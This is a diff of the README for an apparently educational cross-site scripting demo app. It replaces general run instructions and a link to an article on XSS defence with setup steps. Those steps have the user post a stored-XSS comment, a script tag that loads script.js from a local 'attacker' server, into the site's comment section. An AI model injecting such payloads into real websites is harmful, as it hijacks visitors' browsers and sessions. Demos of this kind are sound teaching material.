@@ -1,36 +1,17 @@
-# payload
+### SETUP
 
-`<script src="http://localhost:8000/script.js"></script>`
+1. Run `npm install`
 
-### Running the Application
+2. Run `node server.js`
 
-To run this project, follow these steps:
+3. Run `python runme.py`
 
-1. Clone this repository (`git clone https://github.com/auth0-blog/xss-sample-app.git`)
+4. In comment section of website, enter the following comment -
 
-2. Move to the root folder of the project (`xss-sample-app`) in your machine and install the dependencies by running the following command:
+`<script src="http://localhost:8080/script.js"></script>`
 
-   ```shell
-   npm install
-   ```
+**NOTE** - without the ` part
 
-3. To launch the web application, run the following command:
+5. Click Submit Button
 
-   ```shell
-   node server.js
-   ```
-
-4. Point your browser to [http://localhost:3000](http://localhost:3000) to access the sample web app.
-
-5. To launch the attacker website, run the following command:
-
-   ```shell
-   node attacker-server.js
-   ```
-
-6. Point your browser to [http://localhost:4000](http://localhost:4000/) to access the attacker website
-
-
-
-Please, read [Defend Your Web Apps from Cross-Site Scripting (XSS)](https://auth0.com/blog/cross-site-scripting-xss/) to learn more about XSS attacks and how to prevent them.
-
+6. To reset the website, re-run the node server
